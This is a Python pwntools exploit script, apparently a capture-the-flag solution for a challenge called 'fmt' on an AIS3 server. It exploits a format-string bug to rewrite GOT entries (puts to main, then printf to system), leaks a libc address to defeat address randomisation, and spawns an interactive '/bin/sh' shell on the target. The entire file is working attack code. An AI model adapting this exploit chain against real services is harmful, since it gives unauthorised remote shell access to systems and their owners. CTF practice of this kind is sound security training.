# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#

from pwn import *
from my_pwn_tools import *

fmt = format_s()

def print_payload(payload, message = None):
    if message != None:
        log.info(message)
    payload = str(payload)
    log.info("payload: " + payload)
    log.info("payload length: " + str(len(payload)))

context.arch = "i386"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"

is_local = True

host = "srv01.ctf.ais3.org"
port = 5521
glibc_system_offset = 0x4f440
glibc_printf_offset = 0x64e80
glibc_isoc99_scanf_offset = 0x7bec0
recv_timeout = 0
if is_local:
    host = "127.0.0.1"
    port = 8888
    glibc_system_offset = 0x45390
    glibc_printf_offset = 0x55800
    glibc_isoc99_scanf_offset = 0x6b4d0
    recv_timeout = 0

r = remote(host, port)

#input("Attach in gdb and press Enter")

string_buffer = 0x40074a
write_string = u64(b"/bin/sh\x00")
put_got_address = 0x601018
printf_got_address = 0x601028
scanf_got_address = 0x601038
main_0 = 0x400646 #checked
format_string_paramenter_begin = 6

# change puts got to main
address_save_P_offset = 10
P_offset = format_string_paramenter_begin + address_save_P_offset
fmt.start()
for i in range(8):
    fmt.hhn(main_0 >> (i * 8) & 0xff, P_offset)
    P_offset += 1
fmt.ljust(address_save_P_offset * 8, b"A")
for i in range(8):
    fmt.append(p64(put_got_address + i))

payload = fmt.get()
print_payload(payload, "change puts got to main")
r.sendline(payload)

# leak glibc address
fmt.start()
fmt.append(b"%%%d$s" % 7).ljust(8, b"A").append(p64(scanf_got_address))
payload = fmt.get()
print_payload(payload, "leak glibc address")
r.sendline(payload)

# stuffed IO buffer
leak_massage = b""
for i in range(0xfff):
    log.info("test round: " + str(i))
    r.sendline(b"F")
    leak_message = r.recv(timeout = recv_timeout)
    if leak_message:
        break

glibc_scanf_address_bytes = leak_message[0x209:0x20f].ljust(8, b"\x00")
log.info(glibc_scanf_address_bytes)
glibc_scanf_address = u64(glibc_scanf_address_bytes)
glibc_base = glibc_scanf_address - glibc_isoc99_scanf_offset
glibc_system_address = glibc_base + glibc_system_offset
log.info("glibc system address: " + str(hex(glibc_system_address)))

# write system to printf got
address_save_P_offset = 12
P_offset = format_string_paramenter_begin + address_save_P_offset
fmt.start()
for i in range(8):
    fmt.hhn(glibc_system_address >> (i * 8) & 0xff, P_offset)
    P_offset += 1
fmt.ljust(address_save_P_offset * 8, b"A")
for i in range(8):
    fmt.append(p64(printf_got_address + i))
payload = fmt.get()
print_payload(payload, "write system to printf got")
r.sendline(payload)

r.sendline(b"/bin/sh\x00")
#r.sendline("cat /home/fmt/flag")

r.interactive("Pwned # ")

